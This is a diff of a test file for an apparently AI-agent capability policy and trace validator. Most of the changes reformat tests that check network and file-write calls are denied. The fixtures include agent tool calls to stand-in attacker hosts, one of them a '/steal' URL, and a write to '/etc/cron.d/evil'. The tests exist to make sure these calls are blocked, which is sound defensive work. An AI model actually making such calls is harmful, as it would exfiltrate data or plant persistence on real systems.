@@ -1,8 +1,8 @@
 import { describe, expect, it } from "bun:test";
+import type { CapabilityManifest } from "@wasmagent/core";
 import { compileToMcpSchema } from "./mcpSchema.js";
 import { compileToPolicy } from "./policy.js";
 import { compileToTraceValidator } from "./traceValidator.js";
-import type { CapabilityManifest } from "@wasmagent/core";
 
 const DENY_ALL: CapabilityManifest = {
   allowedHosts: [],
@@ -59,9 +59,15 @@ describe("compileToPolicy — deny-all manifest", () => {
   const policy = compileToPolicy(DENY_ALL);
 
   it("denies a network call when allowedHosts is empty", () => {
-    const r = policy.evaluate({ toolName: "web_fetch", args: {}, resolvedHost: "evil.example.com" });
+    const r = policy.evaluate({
+      toolName: "web_fetch",
+      args: {},
+      resolvedHost: "evil.example.com",
+    });
     expect(r.decision).toBe("deny");
-    expect(r.results.some((x) => x.ruleId === "network:deny-all" && x.outcome === "deny")).toBe(true);
+    expect(r.results.some((x) => x.ruleId === "network:deny-all" && x.outcome === "deny")).toBe(
+      true
+    );
   });
 
   it("allows a non-network call", () => {
@@ -86,11 +92,17 @@ describe("compileToPolicy — restricted manifest", () => {
   it("denies a call to a disallowed host", () => {
     const r = policy.evaluate({ toolName: "web_fetch", args: {}, resolvedHost: "attacker.com" });
     expect(r.decision).toBe("deny");
-    expect(r.results.find((x) => x.ruleId === "network:allowlist")?.reason).toContain("attacker.com");
+    expect(r.results.find((x) => x.ruleId === "network:allowlist")?.reason).toContain(
+      "attacker.com"
+    );
   });
 
   it("allows write to an allowed path", () => {
-    const r = policy.evaluate({ toolName: "write_file", args: {}, resolvedPath: "/workspace/foo.ts" });
+    const r = policy.evaluate({
+      toolName: "write_file",
+      args: {},
+      resolvedPath: "/workspace/foo.ts",
+    });
     expect(r.decision).not.toBe("deny");
   });
 
@@ -111,13 +123,15 @@ describe("compileToTraceValidator", () => {
   const validator = compileToTraceValidator(DENY_ALL);
 
   it("flags network call in trace when network denied", () => {
-    const steps = [{
-      step_index: 0,
-      role: "agent",
-      tool_name: "web_fetch",
-      tool_args: { url: "https://attacker.example.com/steal" },
-      content: "",
-    }];
+    const steps = [
+      {
+        step_index: 0,
+        role: "agent",
+        tool_name: "web_fetch",
+        tool_args: { url: "https://attacker.example.com/steal" },
+        content: "",
+      },
+    ];
     const violations = validator.validate(steps);
     expect(violations.length).toBeGreaterThan(0);
     expect(violations[0]!.ruleId).toBe("network:deny-all");
@@ -126,38 +140,44 @@ describe("compileToTraceValidator", () => {
 
   it("flags write outside allowed paths", () => {
     const v = compileToTraceValidator(RESTRICTED);
-    const steps = [{
-      step_index: 0,
-      role: "agent",
-      tool_name: "write_file",
-      tool_args: { path: "/etc/cron.d/evil" },
-      content: "",
-    }];
+    const steps = [
+      {
+        step_index: 0,
+        role: "agent",
+        tool_name: "write_file",
+        tool_args: { path: "/etc/cron.d/evil" },
+        content: "",
+      },
+    ];
     const violations = v.validate(steps);
     expect(violations.some((x) => x.ruleId === "fs:write-path-violation")).toBe(true);
   });
 
   it("returns no violations for a compliant trace", () => {
     const v = compileToTraceValidator(RESTRICTED);
-    const steps = [{
-      step_index: 0,
-      role: "agent",
-      tool_name: "write_file",
-      tool_args: { path: "/workspace/main.ts" },
-      content: "",
-    }];
+    const steps = [
+      {
+        step_index: 0,
+        role: "agent",
+        tool_name: "write_file",
+        tool_args: { path: "/workspace/main.ts" },
+        content: "",
+      },
+    ];
     const violations = v.validate(steps);
     expect(violations.filter((x) => x.severity === "error")).toHaveLength(0);
   });
 
   it("ignores environment steps", () => {
-    const steps = [{
-      step_index: 0,
-      role: "environment",
-      tool_name: "web_fetch",
-      tool_args: { url: "https://attacker.example.com" },
-      content: "result",
-    }];
+    const steps = [
+      {
+        step_index: 0,
+        role: "environment",
+        tool_name: "web_fetch",
+        tool_args: { url: "https://attacker.example.com" },
+        content: "result",
+      },
+    ];
     const violations = validator.validate(steps);
     expect(violations).toHaveLength(0);
   });
